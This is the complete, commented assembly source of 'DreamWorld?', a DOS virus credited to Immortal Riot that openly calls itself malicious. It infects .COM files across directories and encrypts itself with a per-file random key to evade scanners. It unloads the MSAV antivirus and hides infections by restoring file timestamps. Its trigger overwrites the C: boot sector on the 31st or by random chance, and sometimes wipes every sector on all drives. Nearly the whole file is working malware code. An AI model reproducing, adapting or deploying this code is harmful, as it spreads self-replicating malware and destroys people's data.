;                         -DreamWorld?-
;      "Created by Immortal Riot's destructive development team"
;             (c) 93/94 Immortal Riot - All rights reserved                 
;
; Dedication:
;  "If Metal Militia was dead, this virus should be deadicated to him"
;
; Notes: 
;  This was 'written' in one day. It sucks, but not as good as my..
;  ahh.. now I remember, I don't got a girl-friend, but my "girl-friend"
;  think she got a boy-friend? Huh? She's nuts!
;
; Notes_II:
;  F-Prot, Scan, TBAV, FindViru can't find shits of this code.
;
; Disclaimer: 
;  Well, I just gotta have one, you know. So, I hereby claim this:
;  "I take no responsability for any damage, either direct or implied,
;  caused by the usage of the virus source code or of the resulting code
;  after assembly. No warrant is made about the product functionability
;  or quality. The code was written in pure educational purposes ONLY." 
; 
; Truth: 
;  Well, this was written only for malicious intends. I havn't learned
;  a shit by writing this shit. Now you know that.. Well, I just had
;  some hours spare time, and a huge appetite for destruction. That's why 
;  this virus was created. No more, no less. Ciao! /The Unforgiven

.model tiny			;
.code				;
org    100h			;
				;
Start:  			;
db 0e9h                         ; Jump to start1 and mark this file
DW  0                           ; as virus-infected!
				;
Start1:				;
xchg ax,ax                      ; It's simply two NOPs
nop				; 
				;
mov  ax,0fa01h                  ; Let's un-install MSAV junk program
mov  dx,5945h                   ; from memory for a cost of 8 bytes :)
int  16h                        ; 
				;
call get_delta                  ; Get the delta offset
get_delta:			;
pop     bp                      ;
sub     bp, offset get_delta    ;
				;
Call_en_de_crypt:		; Well, just using alternitive code
mov     ax,bp                   ; for a "call en_de_crypt", for satisfying
add     ax,011dh                ; my very sick brain..     
push    ax			;
jmp     short en_de_crypt       ; 
jmp     short real_code_start   ; Sneee!
				;
crypt_val dw 0                  ; We get a random value for each encryption!
				; 
Write_virus:			;
call    en_de_crypt 		; Encrypt virus before we write!
mov     ah,65d                  ; 65d - 1d = 40HEX!
sub     ah,1d                   ; ^^^ How meaningless!
mov     cx, end_of_virus - start1     ; CX = bytes to write
lea     dx, [bp+start1]         ;     ; DX = Where to write from (100h)
int     21h                     ;     ; Duh!
				;
call en_de_crypt                ; Decrypt virus again 
ret                  		;
				;
En_de_crypt:			; Heuristic, Heuristic, eat this!
				;
mov     ax,word ptr [bp+crypt_val]       
lea     si,[bp+encrypt_start]	;
mov     cx,(end_of_virus-start1+1)/2
				;
Xor_loop:			;
xor     word ptr [si],ax        ; Encrypting two bytes/loop, until
add     si,2                    ; all the code between encryption_start
loop    xor_loop                ; to end_of_virus is encrypted!
ret 				;
				;
Encrypt_start: 		        ; All code here and below is encrypted,
Real_code_start:	       	; making it hard for heuristic scanners!
				;
mov     ah,2ah			; First, we check for what date it is
int     21h			;
cmp     dl,31                   ; Is it the 31st any month?
jne     not_now                 ; Nop!
				;
Cruel:				;
mov     ah,09h			; It's the 31st any month!
lea     dx,[bp+v_name]		; or the 1/100 of a second = 1
int     21h                     ; we'll print a message!
				;
mov     al,2h                	; and after that, we'll brutally
mov     cx,1			; overwrite the first-sector on
lea     bx,v_name	        ; drive C: with our virus name!
cwd				;
int     26h			;
				;
Not_now:                        ; It wasn't the 31:st, so,
mov     ah,2ch			; we'll take a random number
int     21h			; from a 1/100 of a second and if
cmp     dl,1			; the value is 1, we'll trash the
je      cruel			; boot-sector on drive C: and if
cmp     dl,98			; the value is 99 we will brutally
jbe     no_harm			; destroy all sectors on all drives.
				;
Trash_sucker:			; 
mov     al,2h			; We'll start on drive C: (2h)
Drive:				; We'll overwrite one sector/run!
mov     cx,1			; with our virus name, and we'll
lea     bx,v_name	        ; write from sector one, with the
xor     dx,dx			; very nice interrupt 26h (sector write!)
Next_Sector:			; and after we've written one sector we'll
int     26h			; jump to the next sector and overwrite
inc     dx			; that too, and loop until all sectors are
jnc     next_sector		; being overwritten, then, we'll jump to 
inc     al		        ; the next drive, and overwrite all sectors
jmp     short drive		; there as well. And the next drive, and
                                ; the next.. :-). 
No_Harm:			;
lea     dx,[bp+offset dta]      ; Set the DTA to variable called DTA
call    set_dta			; (DTA=42 byte chunk of memory!)
				;
Buf_Xfer:			; Restore the beginning..
lea     si, [bp+offset org3]    ; 
mov     di, 100h                ; DI=100h
push    di		        ; Store di with our new value.
movsw                           ; Move string by word (the first two bytes!)
movsb                           ; Move string by byte (the third byte in the
			        ; buffer), b'cos our org3 buffer is 3 bytes!
				;
Get_drive:			;
mov     ah,19h			; We'll get the drive from were we're executed
int     21h			; from, and if an infected file is being run
cmp     al,2			; from A: or B: we'll not search for more files
jae     Get_dir			; to infect b'cos we havn't got a int24 handler.
ret				; Let the infected files run normally!
				;
Get_dir:			; Get directory from where we're being executed
mov     ah,47h			; from. Must do that b'cos we're using the
sub     dl,dl			; dot-dot method to travel around!
lea     si,[bp+end_of_virus+2ch];
int     21h			;
				;
Findfirst:			;
mov     ah, 4eh                 ; FindFirst file
lea     dx, [bp+masker]         ; with the extension of 'COM'
_4fh:                           ; When called ah=4fh (findnextfile)
int     21h			;
jnc     open_file		; We found a file!
          			; Then, open it!
Chdir:				;
mov     ah,3bh                  ; We didn't find any files
lea     dx,[bp+offset dot_dot]  ; in the current dir, so we'll move
int     21h			; to the ".." location in the tree and
jc      quit			; search for more files, if location doesn't
jmp     short findfirst		; exist (ax=03h), we'll quit, otherwise, we'll
				; search for the first file in the new dir.
Open_file:			;
mov     ax, 3D02h               ; Open the file in read/write mode
lea     dx, [bp+offset dta+1eh] ; Filename is located in DTA at offset 1Eh
int     21h			;
xchg    ax, bx                  ; Faster/bigger than mov BX,AX
  				;
mov     ax,5700h                ; Take the file's time/date
int     21h			; (ah=57h = get/set time/date)
				; (al=01h = get time/date)
push    cx                      ; Store time!
push    dx                      ; Store date!
				;
mov     cx, 3                   ; Read first three bytes of the file
lea     dx, [bp+org3]		; to the buffer (org3)
mov     ah, 3fh			; 
int     21h			;
                                ; Check if already infected
mov     cx, word ptr [bp+ORG3+1];      
mov     ax, word ptr [bp+DTA+1ah]
add     cx, end_of_virus - start1 + 3 
cmp     ax, cx                  ;      
jz      restore_time_date       ; It's already infected!
  				; No, it's not infected! 
sub     ax, 3                   ; 
mov     word ptr [bp+writebuffer], ax 
  				;
xor     al, al                  ; Then, we'll move the file-poiter to
call    f_ptr			; the beginning of the file, and
mov     cx, 3                   ; Write three bytes (our own jmp)
lea     dx, [bp+e9]		; 
mov     ah, 40h			;
int     21h			;
				;
mov     al, 2                   ; Then, we'll move the file-pointer to
call    f_ptr			; end_of_file.
  				;
Get_Random:			;
mov     ah,2ch			; Darn, this little trick is really
int     21h			; cool, b'cos we'll not get the same
add     dl, dh			; encryption-value on any infected file,
jz      get_random		; resulting in no bytes except the one used
mov     word ptr [bp+crypt_val],dx; for the decrypt routine remains constant!
				;
call    write_virus		; Now, write the virus!
  				;
Restore_time_date:		; Cover our tracks..
pop     dx			; Restore file date!
pop     cx			; Restore file time!
				; Notice the order "push cx/dx pop dx/cx!"
mov     ax,5701h                ; ah=57h (get/set attribs),
int     21h			; al=01h (set attribs)
				;
Close_file:			;
mov     ah, 3eh                 ; Close the file,
int     21h			; which now is infected!
  				;
mov     ah, 4fh                 ; This little trick, is really
jmp     short _4fh              ; really neat, I think..
				;
Quit:				;
lea     dx,[bp+end_of_virus+2ch]; First, we'll change back to the
mov     ah,3bh			; directory from where we were executed
int     21h			;
				;
Fix_it:				;
mov     dx, 80h                 ; Then, we'll set back the DTA to its
                                ; default value (note- this is NOT used
				; when the virus is running!)
Set_dta:			;
mov     ah, 1ah                 ; Set the dta, used twice in this virus,
int     21h                     ; one when we started, and now, when we're
				; ready!
Exit:				; Then, we'll return and execute
retn                            ; the "real" program!
				;
F_ptr:  			; Since we moved the file-pointer to
mov     ah, 42h			; end of file twice, this saves some
xor     cx, cx			; bytes!
cwd                             ; Clear dx (smallest variant!)
int     21h                     ;
retn				; Return to caller!
  	            		;
V_name  db '[DreamWorld?]','$'	; It's the name for the virus
dream   db '"I have a dream..."'; Me and Martin Luther King!
msg     db 'Copy me, so I can travel around the globe!'
        db 'Spreading my message, manipulating your'
        db 'thoughts, your mind, and your actions'
        db '"Love, Peace, Empathy!"'
copyr   db "(c) 93/94 Immortal Riot - All rights reserved!"      
		   
Dot_dot db      '..',0 
Masker  db      '*.com',0 
Org3    db      0cdh, 20h, 0 ; original three bytes saved here
E9      db      0e9h ; the jmp
End_of_virus equ $
Writebuffer  dw  ?               ; Scratch area for the JMP
Dta         db 42 dup (?)        ; 42 bytes of chunk in memory, but
				 ; not in the files!
Virus_end:
end start